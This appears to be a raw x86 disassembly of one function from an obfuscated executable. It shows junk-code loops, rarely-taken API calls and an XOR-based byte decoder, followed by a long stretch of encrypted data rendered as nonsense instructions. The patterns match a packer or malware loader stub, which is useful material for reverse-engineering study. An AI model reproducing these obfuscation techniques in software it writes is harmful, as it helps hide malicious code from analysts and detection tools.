  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43379f
  41021e:	adc    DWORD PTR ds:0x4337d7,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43370b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x43382b,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x4337df
  41026b:	or     DWORD PTR ds:0x4337d7,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x4337ab,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x4337ab
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x4337ab,ecx
  410291:	cmp    DWORD PTR ds:0x4337ab,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x4337ab,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x4337ab,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x4337ab
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x4337ab,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433703
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x4337e7,0x43379f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x4337e3,0x433797
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x433757
  41031a:	sub    DWORD PTR ds:0x43371f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x43375b,0x0
  410338:	mov    ecx,DWORD PTR ds:0x43375b
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x43375b,ecx
  410345:	cmp    DWORD PTR ds:0x43375b,0x25
  41034c:	jne    0x410362
  410352:	push   0x4338af
  410357:	push   0x4338ef
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x43375b,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43379f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433813,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433813
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433813,ecx
  41038f:	cmp    DWORD PTR ds:0x433813,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x4337e7
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433813,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433813
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433813,ecx
  4103c8:	cmp    DWORD PTR ds:0x433813,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x43375f,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x433757,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x433757
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x433757,esi
  4103ff:	cmp    DWORD PTR ds:0x433757,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x433757,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0xa5,al
  41049c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41049d:	cdq    
  41049e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41049f:	fdiv   QWORD PTR [eax+0x7caf7e7e]
  4104a5:	jle    0x410525
  4104a7:	test   al,0x5b
  4104a9:	mov    ds:0x2676bbcb,eax
  4104ae:	fidiv  DWORD PTR [ebp-0x74d08987]
  4104b4:	jns    0x410454
  4104b6:	shl    DWORD PTR [esi],1
  4104b8:	mov    edx,eax
  4104ba:	test   esi,esp
  4104bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104bd:	leave  
  4104be:	xchg   edx,eax
  4104bf:	add    BYTE PTR [eax-0x34c06f7b],dl
  4104c5:	inc    eax
  4104c6:	add    eax,0xd5e81144
  4104cb:	cmp    BYTE PTR [edi+0x2086feb],ch
  4104d1:	cmp    esi,DWORD PTR [eax+edx*4-0x6]
  4104d5:	pop    ebp
  4104d6:	outs   dx,DWORD PTR ds:[esi]
  4104d7:	retf   
  4104d8:	jmp    0x853cab53
  4104dd:	shl    DWORD PTR [ebx+0x7b4f8133],1
  4104e3:	push   eax
  4104e4:	sbb    cl,BYTE PTR [ebx+0x4643f6ff]
  4104ea:	fnsave ds:0x7186075b
  4104f0:	mov    DWORD PTR [ebp+0x104a70bd],edx
  4104f6:	repnz shl BYTE PTR [edx+0x5f00309e],0x72
  4104fe:	push   ss
  4104ff:	push   edi
  410500:	clc    
  410501:	xchg   edi,eax
  410502:	sbb    BYTE PTR [ebx],cl
  410504:	jge    0x41056e
  410506:	xchg   edx,eax
  410507:	mov    esp,0xf3282ff1
  41050c:	pop    esp
  41050d:	xchg   ebx,eax
  41050e:	or     bh,BYTE PTR [ebx]
  410510:	stc    
  410511:	sub    al,0x58
  410513:	cmp    al,0xc8
  410515:	in     eax,0xf8
  410517:	mov    eax,esp
  410519:	adc    al,0x97
  41051b:	add    eax,0x567847b3
  410520:	shr    DWORD PTR ds:0xf4671b82,1
  410526:	test   DWORD PTR [ebp-0x7dbf1b7a],esp
  41052c:	push   0xffffffed
  41052e:	data16 sti 
  410530:	inc    eax
  410531:	xchg   ecx,eax
  410532:	jmp    0x8cf6b694
  410537:	xlat   BYTE PTR ds:[ebx]
  410538:	xor    eax,0xb0e45533
  41053d:	push   ebx
  41053e:	push   es
  41053f:	add    al,0x45
  410541:	test   BYTE PTR [ebx+0x21],bl
  410544:	cmp    BYTE PTR [ecx-0x80],ch
  410547:	fadd   QWORD PTR [edx+0x7f]
  41054a:	mov    BYTE PTR [edx+0x47],0x23
  41054e:	pusha  
  41054f:	mov    esp,0x7d9b7bd0
  410554:	popf   
  410555:	xor    bh,bl
  410557:	inc    ebx
  410558:	dec    ecx
  410559:	push   ds
  41055a:	mov    DWORD PTR [eax],esi
  41055c:	dec    edx
  41055d:	test   BYTE PTR [edi-0x39256823],0xb
  410564:	jb     0x410562
  410566:	mov    cs,WORD PTR [ecx]
  410568:	xlat   BYTE PTR ds:[ebx]
  41056a:	leave  
  41056b:	jbe    0x41053c
  41056d:	ret    
  41056e:	cmp    eax,0xa3568444
  410573:	xor    al,0xb4
  410575:	dec    ebx
  410576:	dec    edi
  410577:	jmp    0xcd6f:0x476edec9
  41057e:	(bad)  
  410580:	int3   
  410581:	mov    ah,0x25
  410583:	sbb    DWORD PTR [edx+0x694e4680],esp
  410589:	sbb    BYTE PTR [esi],dh
  41058b:	jns    0x41056f
  41058d:	and    cl,BYTE PTR [eax+0x4b]
  410590:	fstp   QWORD PTR [esi+ebx*1+0x559eddbc]
  410597:	mov    dl,0x8c
  410599:	mov    al,0xdf
  41059b:	dec    esp
  41059c:	jg     0x4105ea
  41059e:	stc    
  41059f:	pop    ecx
  4105a0:	je     0x4105c0
  4105a2:	or     bh,ah
  4105a4:	sbb    ebp,edi
  4105a6:	cmp    DWORD PTR [ebp+0xd],0x489a2f2a
  4105ad:	fwait
  4105ae:	int3   
  4105af:	and    eax,0x5eac596d
  4105b4:	adc    eax,edx
  4105b6:	arpl   WORD PTR [esi+eax*4-0x37fc7d1],sp
  4105bd:	inc    esp
  4105be:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4105c0:	fist   WORD PTR [ecx-0x167707a0]
  4105c6:	clc    
  4105c7:	ja     0x41054b
  4105c9:	cmp    edi,0xffffffd2
  4105cc:	nop
  4105cd:	mov    esp,0x907a811d
  4105d2:	mov    ebp,0x4f43d694
  4105d7:	or     BYTE PTR [ebp-0x5],ah
  4105da:	or     edx,DWORD PTR [esi+0x64d20166]
  4105e0:	fldenv [edx+0x2a6e51ae]
  4105e6:	loop   0x410631
  4105e8:	rol    edx,0xd4
  4105eb:	or     bh,0x93
  4105ee:	cmp    al,0x18
  4105f0:	jo     0x41059e
  4105f2:	test   eax,0x49f55f3f
  4105f7:	and    ah,BYTE PTR [ebx+0x21c37362]
  4105fd:	inc    edx
  4105fe:	pop    ecx
  4105ff:	mov    edi,0x4cff3f9d
  410604:	xor    edi,DWORD PTR [esi-0x5f35eaab]
  41060a:	push   es
  41060b:	jne    0x410665
  41060d:	jbe    0x410608
  41060f:	dec    eax
  410610:	out    0xe1,al
  410612:	cmp    dh,dl
  410614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410615:	mov    dh,0x50
  410617:	jb     0x4105cf
  410619:	repnz mov eax,0xec67ea28
  41061f:	call   0xf8f814f5
  410624:	arpl   WORD PTR [eax],dx
  410626:	sbb    esp,DWORD PTR [edi-0x2c]
  410629:	aaa    
  41062a:	push   ds
  41062b:	push   cs
  41062c:	shl    DWORD PTR [ebx-0x7],0xcf
  410630:	in     eax,dx
  410631:	call   0x8b44:0x466e29fc
  410638:	test   eax,0x8586112d
  41063d:	dec    esp
  41063e:	xchg   ecx,eax
  41063f:	push   ebx
  410640:	aas    
  410641:	pop    esi
  410642:	cld    
  410643:	mov    dl,0x78
  410645:	dec    ebp
  410646:	rol    DWORD PTR [eax],cl
  410648:	push   ebp
  410649:	mov    esi,0xd37e3326
  41064e:	out    0xcf,al
  410650:	sub    eax,0xf224ba7e
  410655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410656:	arpl   WORD PTR [ecx],di
  410658:	ss sahf 
  41065a:	dec    ecx
  41065b:	inc    esp
  41065c:	mov    ds:0x5bb507e,eax
  410661:	xchg   edx,eax
  410662:	popf   
  410663:	mov    esi,0xb0295055
  410668:	dec    esp
  410669:	mov    cl,0x4f
  41066b:	adc    ecx,DWORD PTR [edx]
  41066d:	das    
  41066e:	xchg   edx,eax
  41066f:	arpl   WORD PTR [esi+0x2e],dx
  410672:	das    
  410673:	cmp    eax,0xec58ecf6
  410678:	adc    al,0x5e
  41067a:	aad    0x61
  41067c:	pop    edx
  41067d:	mov    ecx,?
  41067f:	jmp    0x4106e1
  410681:	cmp    eax,edx
  410683:	(bad)  
  410684:	call   0x8bc2f30c
  410689:	jo     0x4106f4
  41068b:	or     dh,0x56
  41068e:	xchg   esi,eax
  41068f:	mov    WORD PTR [ebx-0xd],es
  410692:	xlat   BYTE PTR ds:[ebx]
  410693:	out    0xdd,al
  410695:	or     ah,BYTE PTR [ebx+eiz*1]
  410698:	loop   0x4106f2
  41069a:	ror    DWORD PTR [edi],cl
  41069c:	out    dx,al
  41069d:	or     eax,0x2447615c
  4106a2:	lods   al,BYTE PTR ds:[esi]
  4106a3:	mov    cl,BYTE PTR [esi+0x75]
  4106a6:	fbstp  TBYTE PTR [ecx+eiz*8]
  4106a9:	test   eax,0x692855a4
  4106ae:	sub    DWORD PTR [ebx],ebx
  4106b0:	fsubr  QWORD PTR fs:[esi-0x3b73af92]
  4106b7:	loope  0x4106bf
  4106b9:	push   es
  4106ba:	clc    
  4106bb:	es mov ecx,0xfe9e78d7
  4106c1:	sbb    cl,BYTE PTR [eax+0x25dbf9a1]
  4106c7:	popf   
  4106c8:	js     0x4106d0
  4106ca:	ss sbb eax,0x52465822
  4106d0:	pushf  
  4106d1:	int    0xf7
  4106d3:	push   es
  4106d4:	das    
  4106d5:	in     eax,0xf3
  4106d7:	jmp    0x410736
  4106d9:	xor    bh,BYTE PTR [esi-0x32]
  4106dc:	inc    esi
  4106dd:	sbb    DWORD PTR [ebx-0x7a976444],esp
  4106e3:	ret    
  4106e4:	daa    
  4106e5:	mov    bh,0x7d
  4106e7:	sub    ebp,DWORD PTR [esi+0x4b552e33]
  4106ed:	pop    edi
  4106ee:	test   eax,0xd4dfd81d
  4106f3:	ss out 0x2e,al
  4106f6:	mov    bl,0x81
  4106f8:	fild   QWORD PTR [ecx-0x35e45227]
  4106fe:	sbb    BYTE PTR [ebx+0x48f9b4f9],al
  410704:	mov    esi,0x737072b3
  410709:	jl     0x410715
  41070b:	mov    esi,0x66b24a4f
  410710:	in     eax,0xba
  410712:	dec    cx
  410714:	mov    bl,0x22
  410716:	xchg   BYTE PTR [eax],ch
  410718:	in     al,0x75
  41071a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41071b:	and    BYTE PTR [ebx+0x23e47643],bh
  410721:	fadd   st(4),st
  410723:	out    dx,al
  410724:	in     eax,0x4f
  410726:	mov    ah,dl
  410728:	sub    DWORD PTR [edx+0x1d],esi
  41072b:	push   esi
  41072c:	push   esi
  41072d:	lods   eax,DWORD PTR ds:[esi]
  41072e:	hlt    
  41072f:	jnp    0x41079b
  410731:	fld    QWORD PTR [ebp-0x41]
  410734:	add    dh,BYTE PTR es:[edx]
  410737:	sbb    bh,BYTE PTR [eax]
  410739:	mov    esp,0x8fe98281
  41073e:	fwait
  41073f:	push   ebx
  410740:	mov    ss:0x20a4e25d,eax
  410746:	and    bh,BYTE PTR [esp+edi*8]
  410749:	xor    DWORD PTR [edx],ecx
  41074b:	xor    eax,0x2713ca74
  410750:	inc    esp
  410751:	mov    ecx,0xc8e527f8
  410756:	fsubr  DWORD PTR [ebx+ecx*4+0x3b42f445]
  41075d:	ror    BYTE PTR [edi],1
  41075f:	test   esi,esi
  410761:	cld    
  410762:	(bad)  
  410763:	call   FWORD PTR [edi+0x5b]
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0xc062b867
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x4107d0
  41078c:	repz cmp DWORD PTR [ebx+0x2fa4900],ebx
  410793:	inc    edx
  410794:	xor    ch,BYTE PTR [esi+0x21]
  410797:	pusha  
  410798:	stos   BYTE PTR es:[edi],al
  410799:	das    
  41079a:	xchg   ebp,eax
  41079b:	bound  ebp,QWORD PTR [ebx-0x3a]
  41079e:	call   0xee5d3d97
  4107a3:	jae    0x4107c0
  4107a5:	ds mov esi,0x2e6d6df0
  4107ab:	or     al,0x8c
  4107ad:	mov    dh,0x3e
  4107af:	int3   
  4107b0:	xlat   BYTE PTR ds:[ebx]
  4107b1:	lds    ecx,FWORD PTR [ebp+0xc]
  4107b4:	xor    DWORD PTR [esi],ecx
  4107b6:	push   es
  4107b7:	clc    
  4107b8:	data16 int 0x8b
  4107bb:	ins    DWORD PTR es:[edi],dx
  4107bc:	jnp    0x410793
  4107be:	adc    cl,BYTE PTR [ebp-0x22]
  4107c1:	cmp    al,0x1e
  4107c3:	push   ss
  4107c4:	xor    esi,ecx
  4107c6:	inc    ebp
  4107c7:	mov    cl,0x37
  4107c9:	mov    edi,0x584d37b9
  4107ce:	test   DWORD PTR [edi-0x1f],ebp
  4107d1:	arpl   WORD PTR es:[eax+edx*8+0x16c4b010],si
  4107d9:	jbe    0x410840
  4107db:	repz adc al,0x81
  4107de:	inc    esi
  4107df:	inc    esp
  4107e0:	int    0x89
  4107e2:	ret    0xda7f
  4107e5:	sub    ecx,0x26d3dc0c
  4107eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107ec:	jmp    0x41081c
  4107ee:	jp     0x410804
  4107f0:	pushf  
  4107f1:	cmp    eax,0x666732f5
  4107f6:	pop    edx
  4107f7:	and    eax,0x66117ec1
  4107fc:	test   DWORD PTR [eax-0x57],esp
  4107ff:	xor    eax,0x6cc4cf3
  410804:	adc    al,0x5e
  410806:	in     al,dx
  410807:	sti    
  410808:	lahf   
  410809:	ret    
  41080a:	(bad)  
  41080b:	fst    QWORD PTR [eax+0x1]
  41080e:	loope  0x410805
  410810:	cmc    
  410811:	sub    ecx,DWORD PTR [eax]
  410813:	push   ss
  410814:	out    0x7,eax
  410816:	mov    ch,0xae
  410818:	aad    0x1c
  41081a:	sub    DWORD PTR ds:0xe0401e9a,ecx
  410820:	add    BYTE PTR [ecx],0xc4
  410823:	cmp    ah,BYTE PTR [eax]
  410825:	lea    esi,[eax]
  410827:	jno    0x410872
  410829:	adc    eax,0xaeedc52f
  41082e:	mov    ?,esi
  410830:	add    eax,0x86677d07
  410835:	addr16 mov edx,0xd79b85a0
  41083b:	xchg   edx,eax
  41083c:	test   al,0x90
  41083e:	xor    bh,ah
  410840:	adc    esi,DWORD PTR [ecx-0x67b35295]
  410846:	int    0x3c
  410848:	jbe    0x41080f
  41084a:	int    0x5f
  41084c:	sub    DWORD PTR [edx+0x4a348cf0],ebp
  410852:	jae    0x410810
  410854:	ds jl  0x410825
  410857:	icebp  
  410858:	push   0xc25bf707
  41085d:	pop    ecx
  41085e:	(bad)  
  41085f:	sbb    DWORD PTR [eax-0x7777ec28],edi
  410865:	inc    ebx
  410866:	sbb    cl,al
  410868:	ins    DWORD PTR es:[edi],dx
  410869:	mov    DWORD PTR [esi],ecx
  41086b:	add    eax,DWORD PTR [edi-0x44]
  41086e:	enter  0x12f5,0xc5
  410872:	out    0x1,eax
  410874:	clc    
  410875:	mov    dl,0x3
  410877:	nop
  410878:	fprem  
  41087a:	dec    ecx
  41087b:	imul   ecx,DWORD PTR [edx],0x68f6bbfd
  410881:	in     al,dx
  410882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410883:	out    dx,al
  410884:	lods   al,BYTE PTR ds:[esi]
  410885:	ror    BYTE PTR [edi],1
  410887:	scas   al,BYTE PTR es:[edi]
  410888:	test   eax,0xbfc6151d
  41088d:	hlt    
  41088e:	sbb    edx,DWORD PTR [edx-0xc]
  410891:	fidivr DWORD PTR [edi+0x24e4bf91]
  410897:	(bad)  
  410898:	cmp    dl,BYTE PTR [esi+0x4c10e7a0]
  41089e:	cmp    eax,0x667bd3e
  4108a3:	add    eax,0x8d4b642c
  4108a8:	push   ss
  4108a9:	push   ecx
  4108aa:	inc    ebp
  4108ab:	sub    dh,BYTE PTR [ebx+0x5cb118f0]
  4108b1:	je     0x41083f
  4108b3:	bound  eax,QWORD PTR [esi-0x10]
  4108b6:	rcl    al,cl
  4108b8:	push   ds
  4108b9:	test   bh,dh
  4108bb:	in     al,0x59
  4108bd:	enter  0x77e6,0x74
  4108c1:	inc    ebx
  4108c2:	push   edi
  4108c3:	mov    ch,0xf7
  4108c5:	sub    esp,DWORD PTR [edi-0x60]
  4108c8:	pop    edi
  4108c9:	inc    edi
  4108ca:	mov    eax,ds:0x86b6def2
  4108cf:	jno    0x4108d9
  4108d1:	call   0xbefb:0xfbc14d50
  4108d8:	scas   eax,DWORD PTR es:[edi]
  4108d9:	inc    eax
  4108da:	std    
  4108db:	adc    eax,0xbbe9142a
  4108e0:	mov    ah,0x3d
  4108e2:	daa    
  4108e3:	pusha  
  4108e4:	imul   ecx,DWORD PTR [ebp+0x721bbd13],0x38
  4108eb:	fst    DWORD PTR [ecx-0x48]
  4108ee:	inc    ebx
  4108ef:	mov    bh,0xc5
  4108f1:	cld    
  4108f2:	test   al,0x57
  4108f4:	icebp  
  4108f5:	mov    eax,ds:0xb4a4cd34
  4108fa:	push   edi
  4108fb:	jle    0x410956
  4108fd:	lahf   
  4108fe:	mov    bl,BYTE PTR [ebp+0x3972bd88]
  410904:	sub    ecx,DWORD PTR [edx]
  410906:	imul   edi,DWORD PTR [ecx+ebp*1],0x36
  41090a:	and    edi,ebx
  41090c:	ss scas eax,DWORD PTR es:[edi]
  41090e:	les    edx,FWORD PTR [edi-0x69]
  410911:	push   ss
  410912:	push   es
  410913:	mov    ds:0x5581b380,al
  410918:	rcr    DWORD PTR [edi+0x3927e7be],1
  41091e:	jno    0x410973
  410920:	jae    0x41090f
  410922:	inc    edx
  410923:	xor    eax,0x4becf03
  410928:	in     eax,0x51
  41092a:	fdivr  DWORD PTR [esi]
  41092c:	dec    edx
  41092d:	clc    
  41092e:	cmp    ebp,DWORD PTR [ebp+0x54c92ea4]
  410934:	or     DWORD PTR [ebp-0x34],ecx
  410937:	and    eax,0xf31d25f3
  41093c:	(bad)  
  41093d:	sub    eax,0x5f763f82
  410942:	call   0xb9af03cb
  410947:	call   0xdbb0adce
  41094c:	in     eax,dx
  41094d:	test   al,0xdf
  41094f:	sub    bh,BYTE PTR [edx+ebp*1+0x18]
  410953:	adc    bh,BYTE PTR [esi-0x3]
  410956:	push   edx
  410957:	jnp    0x4109b3
  410959:	fwait
  41095a:	jmp    0xe4fe2b51
  41095f:	das    
  410960:	push   esi
  410961:	inc    ecx
  410962:	(bad)  
  410964:	mov    ecx,0xdf4987b
  410969:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41096a:	in     al,0xe2
  41096c:	xor    DWORD PTR [ebx-0x10],esp
  41096f:	jbe    0x4109c6
  410971:	or     al,BYTE PTR [eax+ebx*8]
  410974:	mov    BYTE PTR [ecx-0x38],ah
  410977:	fucomi st,st(2)
  410979:	or     al,bh
  41097b:	out    dx,eax
  41097c:	xor    dh,dh
  41097e:	lods   al,BYTE PTR ds:[esi]
  41097f:	idiv   dh
  410981:	add    ebx,eax
  410983:	js     0x4109aa
  410985:	push   ss
  410986:	or     eax,DWORD PTR [ecx]
  410988:	daa    
  410989:	outs   dx,BYTE PTR ds:[esi]
  41098a:	arpl   WORD PTR [ebx],cx
  41098c:	test   al,0x6f
  41098e:	cmp    dl,BYTE PTR [eax-0x6285c62e]
  410994:	dec    eax
  410995:	push   edi
  410996:	jne    0x410923
  410998:	and    BYTE PTR [edi-0x2c],bh
  41099b:	sahf   
  41099c:	test   DWORD PTR [edx+ebx*8+0xd609bfe],eax
  4109a3:	fisubr DWORD PTR ds:0x38bf1c29
  4109a9:	sub    edi,DWORD PTR [ebp-0x402c6a7]
  4109af:	sti    
  4109b0:	shl    DWORD PTR [ecx+0x6864456],cl
  4109b6:	push   ecx
  4109b7:	cwde   
  4109b8:	gs mov dh,0x36
  4109bb:	fcom   QWORD PTR [edi+0x7de719cd]
  4109c1:	inc    edi
  4109c2:	es push 0x7b
  4109c5:	xor    DWORD PTR [edi-0x1e692ed8],esi
  4109cb:	sub    eax,0xfe382901
  4109d0:	mov    cl,BYTE PTR [ebp-0x4a5a5e15]
  4109d6:	lahf   
  4109d7:	jg     0x4109bc
  4109d9:	out    dx,al
  4109da:	or     BYTE PTR [eax],ch
  4109dc:	sub    DWORD PTR [edx+0x58],0xffffffaf
  4109e0:	and    dl,cl
  4109e2:	ret    
  4109e3:	lds    edx,FWORD PTR [edx-0x5b]
  4109e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109e7:	mov    ebx,0x9a6aa1ef
  4109ec:	inc    esp
  4109ed:	mov    al,ds:0x620fbfe3
  4109f2:	xor    cl,BYTE PTR [ebx+0x599f5f93]
  4109f8:	scas   eax,DWORD PTR es:[edi]
  4109f9:	out    dx,eax
  4109fa:	(bad)  
  4109fb:	jl     0x4109c6
  4109fd:	shr    BYTE PTR [esi],0xae
  410a00:	aad    0x65
  410a02:	jnp    0x4109ab
  410a04:	out    0xf,al
  410a06:	or     al,0x1c
  410a08:	iret   
  410a09:	rol    BYTE PTR [ebp+0x1feeebcc],1
  410a0f:	mov    ds:0x4f5b4681,eax
  410a14:	jg     0x4109a2
  410a16:	es iret 
  410a18:	inc    esp
  410a19:	out    dx,al
  410a1a:	sar    DWORD PTR [ebp+0x34cb59f6],cl
  410a20:	jge    0x410a33
  410a22:	out    0xad,eax
  410a24:	xor    bh,BYTE PTR ds:0xbce3ce22
  410a2a:	pop    ebp
  410a2b:	mov    al,ds:0x417a35c9
  410a30:	icebp  
  410a31:	sbb    DWORD PTR [eax],0xffffffc0
  410a34:	xor    edi,DWORD PTR [ebp-0x144d26f1]
  410a3a:	in     al,dx
  410a3b:	pop    ss
  410a3c:	add    eax,esi
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	push   eax
  410a50:	sbb    cl,bh
  410a52:	xchg   ecx,eax
  410a53:	mov    edx,0xaf7e7ebd
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410ac2
  410a5c:	stos   BYTE PTR es:[edi],al
  410a5d:	mov    ebp,0x6b1f5296
  410a62:	dec    esi
  410a63:	lock jge 0x410a1d
  410a66:	and    BYTE PTR [esi+0x59a17f3a],ch
  410a6c:	mov    WORD PTR [edx+0x2614151c],ds
  410a72:	or     eax,0x96793856
  410a77:	sbb    dh,BYTE PTR [esi]
  410a79:	mov    ch,0xdb
  410a7b:	push   ds
  410a7c:	or     al,0xd5
  410a7e:	dec    ecx
  410a7f:	outs   dx,BYTE PTR ds:[esi]
  410a80:	xchg   BYTE PTR [ecx-0x40d481b8],dh
  410a86:	pop    edi
  410a87:	pop    ss
  410a88:	sahf   
  410a89:	adc    eax,0x4005c219
  410a8e:	push   ecx
  410a8f:	dec    ebx
  410a90:	test   esp,ebp
  410a92:	and    ebx,DWORD PTR [ecx]
  410a94:	cmp    al,0x71
  410a96:	sub    eax,0xd73c421e
  410a9b:	xchg   esp,eax
  410a9c:	clc    
  410a9d:	lahf   
  410a9e:	cmovg  edx,DWORD PTR ds:0x3cff3c14
  410aa5:	push   ebp
  410aa6:	add    BYTE PTR [edi-0x35b48d73],al
  410aac:	pop    ss
  410aad:	jno    0x410a67
  410aaf:	(bad)  
  410ab0:	outs   dx,BYTE PTR ds:[esi]
  410ab1:	sub    al,0xeb
  410ab3:	ret    
  410ab4:	cmp    al,0x16
  410ab6:	ja     0x410a85
  410ab8:	jge    0x410b32
  410aba:	pop    esp
  410abb:	pop    edx
  410abc:	adc    al,0x7
  410abe:	push   ss
  410abf:	adc    BYTE PTR [ebp+0x724c87ec],0x78
  410ac6:	arpl   WORD PTR [ecx-0x1811ae4d],si
  410acc:	push   ebx
  410acd:	pusha  
  410ace:	jnp    0x410a71
  410ad0:	outs   dx,BYTE PTR ds:[esi]
  410ad1:	test   al,0xcd
  410ad3:	mov    ch,0x3d
  410ad5:	call   0x9040:0x5a648bb3
  410adc:	add    eax,0xd1253e77
  410ae1:	loop   0x410abe
  410ae3:	das    
  410ae4:	popf   
  410ae5:	imul   ebp,ecx,0x8b0dfaaf
  410aeb:	int3   
  410aec:	lea    eax,[ebx-0x66]
  410aef:	sahf   
  410af0:	leave  
  410af1:	ret    
  410af2:	mov    edi,0xca39e70b
  410af7:	retf   0x8cfd
  410afa:	je     0x410aa9
  410afc:	repnz and eax,ebp
  410aff:	mov    edi,0xae3d0d77
  410b04:	fsubr  DWORD PTR [ecx-0x204e2e0b]
  410b0a:	mov    bl,0x15
  410b0c:	xchg   DWORD PTR [ecx-0x58c684ed],ebp
  410b12:	imul   BYTE PTR [edx+eiz*4+0x28]
